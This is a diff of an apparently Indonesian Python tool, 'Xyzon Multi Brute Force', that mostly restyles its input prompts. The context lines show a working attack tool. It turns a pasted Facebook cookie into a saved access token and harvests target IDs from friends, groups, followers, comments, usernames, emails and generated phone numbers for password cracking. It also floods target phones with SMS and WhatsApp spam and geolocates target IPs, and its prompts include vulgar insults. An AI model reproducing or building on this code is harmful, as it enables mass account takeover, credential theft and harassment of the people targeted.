@@ -317,7 +317,7 @@ def login123():
 	logo()
 	cetak(panel(f"[bold white][[bold green]01[bold white]]. [bold cyan]Login Menggunakan Cookies [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]02[bold white]]. [bold cyan]Doa Sebelum Crack [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]03[bold white]]. [bold cyan]Cara Mengambil Cookies Facebook [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]04[bold white]]. [bold cyan]Cek Hasil Crack [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]05[bold white]]. [bold cyan]Hubungi Admin [bold white][[bold green] ON [/][bold white]][/]",width=90,title=f"[bold red][[bold green] Menu Login [bold red]]",style=f"bold red"))
 	cetak(panel(f'[bold cyan]Anda Wajib Login Menggunakan Cookies Untuk Unlock Semua Fitur Spesial Yang Ada Di Script Ini [bold green]By Xyzon Dev',width=90,title=f"[bold red][[bold green] Informasi [bold red]]",style=f"bold red"))
-	vevek = input(f' {P}[{H}+{P}]\33[1;96m Pilih Menu : {P}')
+	vevek = input(f' {P}[{H}+{P}]\33[1;96m Pilih Menu \x1b[1;91m> {P}')
 	if vevek in ['1','01']:
 		laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadimariketemupepekkudajanganlarislebewindonesiaandlampungnihbossenggoldongnantimatiawokawokawokaowkawokawokawokawok()
 	elif vevek in ['2','02']:
@@ -361,7 +361,7 @@ def login():
 def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadimariketemupepekkudajanganlarislebewindonesiaandlampungnihbossenggoldongnantimatiawokawokawokaowkawokawokawokawok():
 	try:
 		cetak(nel('[bold cyan]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account Facebook',width=90,title=f"[bold red][[bold green] Cookies [bold red]]",style=f"bold red"))
-		your_cookies = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mCookie  : \x1b[1;97m')
+		your_cookies = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mCookie  \x1b[1;91m> \x1b[1;97m')
 		with requests.Session() as r:
 			try:
 				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
@@ -405,7 +405,7 @@ def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadima
 							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
 							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
 							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							print(f"\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mToken : \x1b[1;97m{access_token}")
+							print(f"\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mToken \x1b[1;91m> \x1b[1;97m{access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
 							print(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \33[1;92mLogin Berhasil | Ketik Perintah Di Bawah Ini")
@@ -435,9 +435,9 @@ def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	cetak(panel(f'[bold cyan]Terima Kasih Kepada [bold green]Xyzon Dev[bold cyan] Yang Telah Membuat Script Ini [bold yellow]Xyzon Multi Brute Force',width=90,style=f"bold red"))
 	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold cyan]Username : [bold yellow]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold cyan]User Idz : [bold yellow]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold cyan]User Ip  : [bold yellow]{ip}[/][/][bold white]\n[bold white][[bold green]•[/][bold white]][/] [bold cyan]Tanggal  : [bold yellow]{tgl} {bln} {thn}[/][/][bold white]\n[[bold green]•[/][bold white]][/] [bold cyan]Status   : [bold green]Premium ',width=90,title=f"[bold red][[bold green] {Definisi__Waktu()} [bold red]]",style=f"bold red"))
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/]. [bold cyan]Crack ID From Pubilc Friends [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/]. [bold cyan]Crack ID From Random Massal [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/]. [bold cyan]Crack ID From Username [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/]. [bold cyan]Crack ID From Member Grup [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/]. [bold cyan]Crack ID From Total Followers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/]. [bold cyan]Crack ID From Email Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/]. [bold cyan]Crack ID From File Kita [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold cyan]Crack ID From Nomor Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/]. [bold cyan]Crack ID From Komen Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/]. [bold cyan]Check Hasil Crack [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/]. [bold cyan]Chekpoint Detector [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]12[/][bold white]][/]. [bold cyan]Get Headers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]13[/][bold white]][/]. [bold cyan]Lacak IP Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]14[/][bold white]][/]. [bold cyan]Spam Sms Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]15[/][bold white]][/]. [bold cyan]Spam WhatsApp Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]16[/][bold white]][/]. [bold cyan]Bot Komen Facebook [bold white][[bold green] ON [bold white]][bold white]\n[[bold green]17[/][bold white]][/]. [bold cyan]Ingfo Author [bold yellow]XMBF [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]18[/][bold white]][/]. [bold cyan]Report Bug Script [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]RM[/][bold white]][/]. [bold cyan]Remove Data Login [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold red]00[/][bold white]][/]. [bold red]Keluar Script [bold white][[bold green] ON [bold white]][/]',width=90,title=f"[bold red][[bold green] List Menu [bold red]]",style=f"bold red"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/]. [bold cyan]Crack ID From Pubilc Friends [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/]. [bold cyan]Crack ID From Random Massal [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/]. [bold cyan]Crack ID From Username [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/]. [bold cyan]Crack ID From Member Grup [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/]. [bold cyan]Crack ID From Total Followers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/]. [bold cyan]Crack ID From Email Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/]. [bold cyan]Crack ID From File Kita [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/]. [bold cyan]Crack ID From Nomor Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/]. [bold cyan]Crack ID From Komen Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/]. [bold cyan]Check Hasil Crack [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/]. [bold cyan]Chekpoint Detector [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]12[/][bold white]][/]. [bold cyan]Get Headers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]13[/][bold white]][/]. [bold cyan]Lacak IP Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]14[/][bold white]][/]. [bold cyan]Spam Sms Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]15[/][bold white]][/]. [bold cyan]Spam WhatsApp Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]16[/][bold white]][/]. [bold cyan]Bot Komen Facebook [bold white][[bold green] ON [bold white]][bold white]\n[[bold green]17[/][bold white]][/]. [bold cyan]Ingfo Author [bold yellow]XMBF [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]18[/][bold white]][/]. [bold cyan]Report Bug Script [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]RM[/][bold white]][/]. [bold cyan]Remove Data Login [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold red]00[/][bold white]][/]. [bold red]Keluar Script [bold white][[bold green] ON [bold white]][/]',width=90,title=f"[bold red][[bold green] List Menu [bold red]]",style=f"bold red"))
 	cetak(panel(f'    [bold Red]Warning[bold cyan] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan [bold green]By Xyzon Dev',width=90,title=f"[bold red][[bold green] Informasi Crack [bold red]]",style=f"bold red"))
-	_____xyzon___xd____ = input(f' {P}[{H}+{P}] \33[1;96mPilih Menu Crack : {P}')
+	_____xyzon___xd____ = input(f' {P}[{H}+{P}] \33[1;96mPilih Menu Crack \x1b[1;91m> {P}')
 	if _____xyzon___xd____ in ['1','01']:
 		xyzoncrackpublik()
 	elif _____xyzon___xd____ in ['2','02']:
@@ -508,8 +508,8 @@ def memeklovekontolmekarid():
 		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;91mCookies Kadaluarsa ')
 		time.sleep(5)
 		login()
-	link = input(f" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mMasukan Link Postingan : ")
-	jumlah = int(input(f" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mMasukan Share : "))
+	link = input(f" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mMasukan Link Postingan \x1b[1;91m> \x1b[1;97m")
+	jumlah = int(input(f" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mMasukan Share \x1b[1;91m>\x1b[1;97m "))
 	memek = datetime.now()
 	try:
 		n = 0
@@ -529,7 +529,7 @@ def memeklovekontolmekarid():
 		print(f"\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mAnda Tidak Terhubung Ke Internet");exit()    
 #----------------------[ LACAK IP ]----------------------#
 def lacak_ip():
-    b = input(f' \x1b[1;97m[\x1b[1;92m?\x1b[1;97m]\x1b[1;93m \x1b[1;96mMasukkan IP Target : \x1b[1;93m')
+    b = input(f' \x1b[1;97m[\x1b[1;92m?\x1b[1;97m]\x1b[1;93m \x1b[1;96mMasukkan IP Target \x1b[1;91m> \x1b[1;93m')
     if b in [""]:
         jalan("\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Isi Yang Benar !")
         menu()
@@ -574,27 +574,27 @@ def lacak_ip():
         ma = a["maps"]
     except KeyError:
         ma = " "
-    jalan("\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mStatus : \x1b[1;93m" + bn)
-    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mIP Target : \x1b[1;93m" + ip)
-    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mNegara : \x1b[1;93m" + ng)
-    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mKode Negara : \x1b[1;93m" + cc)
-    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mProvinsi : \x1b[1;93m" + pr)
-    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mKota : \x1b[1;93m" + kt)
-    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mKode Pos : \x1b[1;93m" + kb)
-    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mZona Waktu : \x1b[1;93m" + tz)
-    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mProvider : \x1b[1;93m" + sp)
-    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96m Link Google Maps :" + ma)
-    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mInfo Lengkap : http://ip-api.com/#" + ip)
+    jalan("\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mStatus \x1b[1;91m> \x1b[1;93m" + bn)
+    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mIP Target \x1b[1;91m> \x1b[1;93m" + ip)
+    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mNegara \x1b[1;91m> \x1b[1;93m" + ng)
+    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mKode Negara \x1b[1;91m> \x1b[1;93m" + cc)
+    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mProvinsi \x1b[1;91m> \x1b[1;93m" + pr)
+    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mKota \x1b[1;91m> \x1b[1;93m" + kt)
+    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mKode Pos \x1b[1;91m> \x1b[1;93m" + kb)
+    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mZona Waktu \x1b[1;91m> \x1b[1;93m" + tz)
+    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mProvider \x1b[1;91m> \x1b[1;93m" + sp)
+    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96m Link Google Maps \x1b[1;91m>" + ma)
+    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mInfo Lengkap \x1b[1;91m> http://ip-api.com/#" + ip)
     
     sayangku = input(p+""+P+" ["+O+" Tekan Enter "+P+"] ")
     back()
 #------------------[ CRACK NOMOR ]-------------------# 
 def crack_nomor():
 	cetak(nel('  [bold cyan]Crack Menggunakan Nomor Wajib Menggunakan Sandi Manual Saat Crack ',width=90,title=f"[bold red][[bold green] Crack Nomor [bold red]]",style=f"bold red"))
-	depan = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96m Awalan Nomor :\x1b[1;97m ')
+	depan = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96m Awalan Nomor \x1b[1;91m>\x1b[1;97m ')
 	if len(depan)==3:pass
 	else:exit(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mContoh Awalan Nomor 08 (Kosong Delapan)')
-	jumla = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mJumlah :\x1b[1;97m ')
+	jumla = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mJumlah \x1b[1;91m>\x1b[1;97m ')
 	for x in range(int(jumla)):
 		rr = random.randint
 		A = depan
@@ -608,12 +608,12 @@ def crack_nomor():
 	setting()
 #-------------------[ DOA HALAL ]-----------------------#
 def doa_halal():
-	cetak(nel(f'''\x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96m {H2}Versi Arab Stay Halal : [bold cyan]  لَّهُمَّ إِنِّيْ ظَلَمْتُ نَفْسِيْ ظُلْمًا كَثِيْرًا، وَلاَ يَغْفِرُ الذُّنُوْبَ إِلاَّ أَنْتَ، فَاغْفِرْ لِيْ مَغْفِرَةً مِنْ عِنْدِكَ، وَارْحَمْنِيْ، إِنَّكَ أَنْتَ الْغَفُوْرُ الرَّحِيْمُ
-\x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96m Versi Latin Stay Halal : [bold cyan]Allaahumma innii zholamtu nafsi zhulman katsiiron, wa laa yaghfirudz-dzunuuba illaa anta, faghfir lii maghfirotan min 'indika, warhamni, innaka antal ghofuurur-rahim''',title=f'[ Doa Sebelum Crack ]',subtitle_align='center',padding=1,style='bold red'))
+	cetak(nel(f'''\x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96m {H2}Versi Arab Stay Halal \x1b[1;91m> [bold cyan]  لَّهُمَّ إِنِّيْ ظَلَمْتُ نَفْسِيْ ظُلْمًا كَثِيْرًا، وَلاَ يَغْفِرُ الذُّنُوْبَ إِلاَّ أَنْتَ، فَاغْفِرْ لِيْ مَغْفِرَةً مِنْ عِنْدِكَ، وَارْحَمْنِيْ، إِنَّكَ أَنْتَ الْغَفُوْرُ الرَّحِيْمُ
+\x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96m Versi Latin Stay Halal \x1b[1;91m> [bold cyan]Allaahumma innii zholamtu nafsi zhulman katsiiron, wa laa yaghfirudz-dzunuuba illaa anta, faghfir lii maghfirotan min 'indika, warhamni, innaka antal ghofuurur-rahim''',title=f'[ Doa Sebelum Crack ]',subtitle_align='center',padding=1,style='bold red'))
 ###---------[ CRACK DARI KOMEN ]---------- ###
 def komen():
 	cetak(panel(f"[bold cyan]   Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,title=f"[bold red][[bold green] Crack Komen [bold red]]",style=f"bold red"))
-	ide = input(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mMasukan Id Postingan : \x1b[1;97m')
+	ide = input(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mMasukan Id Postingan \x1b[1;91m> \x1b[1;97m')
 	url = 'https://mbasic.facebook.com/'+ide
 	try:get_komen(url)
 	except KeyboardInterrupt:setting()
@@ -663,7 +663,7 @@ def crack_file():
 				lol.update({str(cih):str(isi)})
 				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
 				print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
-		geeh = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mPilih :\x1b[1;97m ')
+		geeh = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mPilih \x1b[1;91m>\x1b[1;97m ')
 		try:geh = lol[geeh]
 		except KeyError:
 			print(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;91mPilih Yang Bener Kontol {x}')
@@ -748,7 +748,7 @@ def pengikut():
 		exit()
 	ses = requests.Session()
 	cetak(panel(f"[bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri",width=90,title=f"[bold red][[bold green] Crack Folowers [bold red]]",style=f"bold red"))
-	akun = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan]Masukan Id Target : ')
+	akun = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan]Masukan Id Target \x1b[1;91m> \x1b[1;97m')
 	try:
 		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
@@ -786,7 +786,7 @@ def process_data1():
 def spam_sms():
 	global nomor 
 	cetak(panel(f'''  [bold cyan]Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,title=f"[bold red][[bold green] Spam Sms [bold red]]",style=f"bold red"))
-	nomor = input(f" {P}[{H}+{P}]\33[1;96m Input No Hp : {P}+62").replace("+62","")
+	nomor = input(f" {P}[{H}+{P}]\33[1;96m Input No Hp \x1b[1;91m> {P}+62").replace("+62","")
 	if nomor == "":
 		pass
 	else:
@@ -1148,7 +1148,7 @@ class sxp_sms:
 def spam_wa():
 	global nomor
 	cetak(panel(f''' [bold cyan]  Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,title=f"[bold red][[bold green] Spam WhatsApp [bold red]]",style=f"bold red"))
-	nomor = input(f" {P}[{H}+{P}]\33[1;96m Input No Hp : {P}+62").replace("+62","")
+	nomor = input(f" {P}[{H}+{P}]\33[1;96m Input No Hp \x1b[1;91m> {P}+62").replace("+62","")
 	if nomor == "":
 		pass
 	else:
@@ -1303,7 +1303,7 @@ def crack_nama():
 	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
 	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
 	cetak(panel(f"    {O}Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,title=f"[bold red][[bold green] Crack Username [bold red]]",style=f"bold red"))
-	nam = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan]Masukan Nama : ').split(",")
+	nam = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan]Masukan Nama \x1b[1;91m> \x1b[1;97m').split(",")
 	for ser in nam:		
 		for belakang in custom:
 			id = ser+belakang
@@ -1343,17 +1343,17 @@ def crack_email():
 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
 	global ok , cp
 	cetak(nel(f'[bold cyan]Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,title=f"[bold red][[bold green] Crack Email [bold red]]",style=f"bold red"))
-	nama = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Masukan Nama Target : ')
+	nama = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Masukan Nama Target \x1b[1;91m>\x1b[1;97m ')
 	if ',' in str(nama):
 		print(f" {P}[{H}+{P}] \33[1;91mMasukan Nama, Jangan Kosong Ngab")
 		time.sleep(3);exit()
 	cetak(nel(f'[bold cyan]Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold red"))
-	doma = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Masukan Nama Domain : ')
+	doma = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Masukan Nama Domain \x1b[1;91m>\x1b[1;97m ')
 	if '@' not in str(doma) or '.com' not in str(doma):
 		print(f" {P}[{H}+{P}]\33[1;91m Masukan Domain Dengan Benar")
 		time.sleep(3);exit()
 	cetak(nel(f'[bold cyan]Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold red"))
-	jumlah = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Total Dump : ')
+	jumlah = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Total Dump \x1b[1;91m>\x1b[1;97m ')
 	for xyz in range(int(jumlah)):
 		A = nama
 		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
@@ -1370,7 +1370,7 @@ def crack_email():
 #-----------------[ CRACK GRUP ]-----------------# 
 def crack_group():
 	cetak(nel('[bold cyan] Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,title=f"[bold red][[bold green] Crack Grup [bold red]]",style=f"bold red"))
-	link = input(f' {P}[{H}+{P}]\33[1;96m Id Group : {P}')
+	link = input(f' {P}[{H}+{P}]\33[1;96m Id Group \x1b[1;91m> {P}')
 	url = "https://mbasic.facebook.com/groups/"+link
 	try:dump_grup(url)
 	except KeyboardInterrupt:atur_atur()
@@ -1399,7 +1399,7 @@ def dump_grup(url):
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Hasil CP[/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold red][[bold green] Hasil Result [bold red]]",style=f"bold red"))
-	kz = input(f' {P}[{H}+{P}]\33[1;96m Pilih : {P}')
+	kz = input(f' {P}[{H}+{P}]\33[1;96m Pilih :\x1b[1;91m> {P}')
 	if kz in ['2','02']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
@@ -1468,7 +1468,7 @@ def result():
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input('\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;96m Pilih : ')
+			geeh = input('\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;96m Pilih \x1b[1;91m>\x1b[1;97m ')
 			try:geh = lol[geeh]
 			except KeyError:
 				print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Pilih Yang Bener Kontol ')
@@ -1500,7 +1500,7 @@ def xyzoncrackpublik():
 	except IOError:
 		exit()
 	cetak(panel('\t          [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red][[bold green] Crack Publik [bold red]]",style=f"bold red"))
-	pil = input(f' {P}[{H}+{P}]\33[1;96m Target ID :{P} ')
+	pil = input(f' {P}[{H}+{P}]\33[1;96m Target ID \x1b[1;91m>{P} ')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
 		for pi in koH['friends']['data']:
@@ -1524,7 +1524,7 @@ def dump_massal():
 		exit()
 	try:
 		cetak(panel('\t          [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red][[bold green] Crack Massal [bold red]]",style=f"bold red"))
-		jum = int(input(f' {P}[{H}+{P}]\33[1;96m Mau Berapa Idz Target  :{P} '))
+		jum = int(input(f' {P}[{H}+{P}]\33[1;96m Mau Berapa Idz Target  \x1b[1;91m>{P} '))
 	except ValueError:
 		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Wrong input ')
 		exit()
@@ -1535,7 +1535,7 @@ def dump_massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input(f' \33[1;96mMasukan Idz Target Yang Ke '+str(yz)+' : ')
+		kl = input(f' \33[1;96mMasukan Idz Target Yang Ke '+str(yz)+' \x1b[1;91m> \x1b[1;97m')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -1552,7 +1552,7 @@ def dump_massal():
 			print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Unstable Signal ')
 			exit()
 	try:
-		print(f' {P}[{H}+{P}]\33[1;96m Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
+		print(f' {P}[{H}+{P}]\33[1;96m Total Idz Target Yang Terkumpul{x} \x1b[1;91m> {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
@@ -1567,7 +1567,7 @@ def dump_massal():
 def setting():
 	print('')
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Crack Idz Old-New [bold white][[bold red]Not Good[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Crack Idz New-Old [bold white][[bold green]Very Good[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Crack Idz Random [bold white][[bold green]Good[bold white]][/]',width=90,title=f"[bold red][[bold green] Setting Urutan Idz [bold red]]",style=f"bold red"))
-	hu = input(f' {P}[{H}+{P}] \33[1;96mPilih Urutan Idz : {P}')
+	hu = input(f' {P}[{H}+{P}] \33[1;96mPilih Urutan Idz \x1b[1;91m> {P}')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -1589,7 +1589,7 @@ def setting():
 		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91mPilih Yang Bener Kontooll ')
 		exit()
